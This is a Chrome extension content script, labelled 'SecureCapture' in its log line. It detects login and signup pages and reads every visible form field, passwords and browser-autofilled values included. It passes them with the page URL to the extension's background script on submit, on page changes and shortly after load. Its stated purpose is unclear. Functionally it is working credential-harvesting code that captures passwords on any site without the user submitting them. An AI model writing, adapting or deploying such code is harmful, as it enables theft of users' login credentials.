
// Content script to capture form submissions and input changes

// Flag to track if we're on a login or signup page
let isLoginOrSignupPage = false;

// Store inputs we've detected
const detectedInputs: any[] = [];

// Check if the current page is likely a login or signup page
const checkIfLoginOrSignupPage = () => {
  const pageText = document.body.innerText.toLowerCase();
  const url = window.location.href.toLowerCase();
  
  // Check URL for common login/signup patterns
  const urlPatterns = ['login', 'signin', 'sign-in', 'signup', 'sign-up', 'register', 'account', 'auth'];
  const urlMatch = urlPatterns.some(pattern => url.includes(pattern));
  
  // Check page content for common login/signup text
  const contentPatterns = ['login', 'sign in', 'signup', 'sign up', 'register', 'create account', 'forgot password'];
  const contentMatch = contentPatterns.some(pattern => pageText.includes(pattern));
  
  // Check for password fields as a strong indicator
  const hasPasswordField = document.querySelectorAll('input[type="password"]').length > 0;
  
  return urlMatch || (contentMatch && hasPasswordField);
};

// Function to get all form inputs
const captureFormInputs = () => {
  const forms = document.querySelectorAll('form');
  const capturedData: any[] = [];
  
  forms.forEach(form => {
    const inputs = form.querySelectorAll('input:not([type="hidden"]):not([type="submit"]):not([type="button"])');
    const formInputs: any[] = [];
    
    inputs.forEach(input => {
      const inputEl = input as HTMLInputElement;
      if (inputEl.value.trim()) {
        formInputs.push({
          type: inputEl.type,
          name: inputEl.name || inputEl.id || inputEl.placeholder || inputEl.type,
          value: inputEl.value,
          isAutoFill: inputEl.matches(':-webkit-autofill') || 
                      // Check for other autofill indicators
                      inputEl.classList.contains('autofill') || 
                      inputEl.hasAttribute('autocomplete')
        });
      }
    });
    
    if (formInputs.length > 0) {
      capturedData.push({
        formAction: form.action,
        formId: form.id,
        formName: form.name,
        inputs: formInputs
      });
    }
  });
  
  return capturedData;
};

// Send data to background script
const sendDataToBackground = (data: any[]) => {
  if (data.length === 0) return;
  
  chrome.runtime.sendMessage({
    type: 'FORM_DATA',
    url: window.location.href,
    title: document.title,
    timestamp: Date.now(),
    data
  });
};

// Setup form submission listeners
const setupFormListeners = () => {
  const forms = document.querySelectorAll('form');
  
  forms.forEach(form => {
    form.addEventListener('submit', () => {
      const data = captureFormInputs();
      sendDataToBackground(data);
    });
  });
};

// Setup input change detection
const setupInputObserver = () => {
  // Select the node that will be observed for mutations
  const targetNode = document.body;

  // Options for the observer (which mutations to observe)
  const config = { childList: true, subtree: true, attributes: true, attributeFilter: ['value'] };

  // Callback function to execute when mutations are observed
  const callback = (mutationsList: MutationRecord[]) => {
    let inputsChanged = false;
    
    for (const mutation of mutationsList) {
      if (mutation.type === 'childList') {
        // Check for new input elements
        mutation.addedNodes.forEach((node) => {
          if (node.nodeType === Node.ELEMENT_NODE) {
            const element = node as Element;
            const inputs = element.querySelectorAll('input');
            if (inputs.length > 0) {
              inputsChanged = true;
            }
          }
        });
      } else if (mutation.type === 'attributes') {
        if (mutation.target instanceof HTMLInputElement) {
          inputsChanged = true;
        }
      }
    }
    
    if (inputsChanged && isLoginOrSignupPage) {
      // Capture form data after a short delay to allow values to settle
      setTimeout(() => {
        const data = captureFormInputs();
        sendDataToBackground(data);
      }, 500);
    }
  };

  // Create an observer instance linked to the callback function
  const observer = new MutationObserver(callback);

  // Start observing the target node for configured mutations
  observer.observe(targetNode, config);
};

// Initialize the content script
const init = () => {
  // Check if we're on a login/signup page
  isLoginOrSignupPage = checkIfLoginOrSignupPage();
  
  if (isLoginOrSignupPage) {
    console.log('SecureCapture: Login or signup page detected');
    
    // Setup form submission listeners
    setupFormListeners();
    
    // Setup input observer
    setupInputObserver();
    
    // Initial data capture after page load
    setTimeout(() => {
      const data = captureFormInputs();
      sendDataToBackground(data);
    }, 1500);
  }
};

// Run the script after the page has fully loaded
if (document.readyState === 'complete') {
  init();
} else {
  window.addEventListener('load', init);
}
